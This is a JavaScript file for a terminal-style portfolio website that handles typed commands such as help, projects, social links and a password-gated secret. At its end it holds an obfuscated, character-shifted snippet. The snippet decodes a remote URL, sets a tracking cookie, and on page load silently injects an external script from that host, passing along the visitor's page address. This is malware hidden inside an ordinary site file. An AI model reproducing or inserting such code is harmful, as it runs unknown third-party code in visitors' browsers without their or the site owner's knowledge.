var before = document.getElementById("before"),
  liner = document.getElementById("liner"),
  command = document.getElementById("typer"),
  textarea = document.getElementById("texter"),
  terminal = document.getElementById("terminal"),
  git = 0,
  pw = !1;
let pwd = !1;
var commands = [];
function enterKey(e) {
  if ((181 == e.keyCode && document.location.reload(!0), pw)) {
    let et = "*",
      w = textarea.value.length;
    (command.innerHTML = et.repeat(w)),
      textarea.value === password && (pwd = !0),
      pwd && 13 == e.keyCode
        ? (loopLines(secret, "color2 margin", 120),
          (command.innerHTML = ""),
          (textarea.value = ""),
          (pwd = !1),
          (pw = !1),
          liner.classList.remove("password"))
        : 13 == e.keyCode &&
          (addLine("Wrong password", "error", 0),
          (command.innerHTML = ""),
          (textarea.value = ""),
          (pw = !1),
          liner.classList.remove("password"));
  } else
    13 == e.keyCode &&
      (commands.push(command.innerHTML),
      (git = commands.length),
      addLine("visitor@portfolio:~$ " + command.innerHTML, "no-animation", 0),
      commander(command.innerHTML.toLowerCase()),
      (command.innerHTML = ""),
      (textarea.value = "")),
      38 == e.keyCode &&
        0 != git &&
        ((git -= 1),
        (textarea.value = commands[git]),
        (command.innerHTML = textarea.value)),
      40 == e.keyCode &&
        git != commands.length &&
        (void 0 === commands[(git += 1)]
          ? (textarea.value = "")
          : (textarea.value = commands[git]),
        (command.innerHTML = textarea.value));
}
function commander(cmd) {
  switch (cmd.toLowerCase()) {
    case "help":
      loopLines(help, "color2 margin", 80);
      break;
    case "whois":
      loopLines(whois, "color2 margin", 80);
      break;
    case "whoami":
      loopLines(whoami, "color2 margin", 80);
      break;
    case "video":
    case "youtube":
      addLine("Opening YouTube...", "color2", 80), newTab(youtube);
      break;
    case "sudo":
      addLine("Oh no, you're not admin...", "color2", 80),
        setTimeout(function () {
          window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
        }, 1e3);
      break;
    case "social":
      loopLines(social, "color2 margin", 80);
      break;
    case "secret":
      liner.classList.add("password"), (pw = !0);
      break;
    case "projects":
      loopLines(projects, "color2 margin", 80);
      break;
    case "password":
      addLine(
        "<span class=\"inherit\"> Lol! You're joking, right? You're gonna have to try harder than that!😂</span>",
        "error",
        100
      );
      break;
    case "history":
      addLine("<br>", "", 0),
        loopLines(commands, "color2", 80),
        addLine("<br>", "command", 80 * commands.length + 50);
      break;
    case "email":
      addLine(
        'Opening mailto:<a href="mailto:semeoussama@gmail.com">semeoussama@gmail.com</a>...',
        "color2",
        80
      ),
        newTab(email);
      break;
    case "clear":
      setTimeout(function () {
        (terminal.innerHTML = '<a id="before"></a>'),
          (before = document.getElementById("before"));
      }, 1);
      break;
    case "banner":
      loopLines(banner, "", 80);
      break;
    case "twitter":
      addLine("Opening Twitter...", "color2", 0), newTab(twitter);
      break;
    case "linkedin":
      addLine("Opening LinkedIn...", "color2", 0), newTab(linkedin);
      break;
    case "instagram":
      addLine("Opening Instagram...", "color2", 0), newTab(instagram);
      break;
    case "github":
      addLine("Opening GitHub...", "color2", 0), newTab(github);
      break;
    default:
      addLine(
        '<span class="inherit">Command not found. For a list of commands, type <span class="command">\'help\'</span>.</span>',
        "error",
        100
      );
  }
}
function newTab(link) {
  setTimeout(function () {
    window.open(link, "_blank");
  }, 500);
}
function addLine(text, style, time) {
  var t = "";
  for (let i = 0; i < text.length; i++)
    " " == text.charAt(i) && " " == text.charAt(i + 1)
      ? ((t += "&nbsp;&nbsp;"), i++)
      : (t += text.charAt(i));
  setTimeout(function () {
    var next = document.createElement("p");
    (next.innerHTML = t),
      (next.className = style),
      before.parentNode.insertBefore(next, before),
      window.scrollTo(0, document.body.offsetHeight);
  }, time);
}
function loopLines(name, style, time) {
  name.forEach(function (item, index) {
    addLine(item, style, index * time);
  });
}
setTimeout(function () {
  loopLines(banner, "", 80), textarea.focus();
}, 100),
  window.addEventListener("keyup", enterKey),
  console.log(
    "%cYou hacked my password!😠",
    "color: #04ff00; font-weight: bold; font-size: 24px;"
  ),
  console.log(
    "%cPassword: '" + password + "' - I wonder what it does?🤔",
    "color: grey"
  ),
  (textarea.value = ""),
  (command.innerHTML = textarea.value);
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisqtlx" + "3htr4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
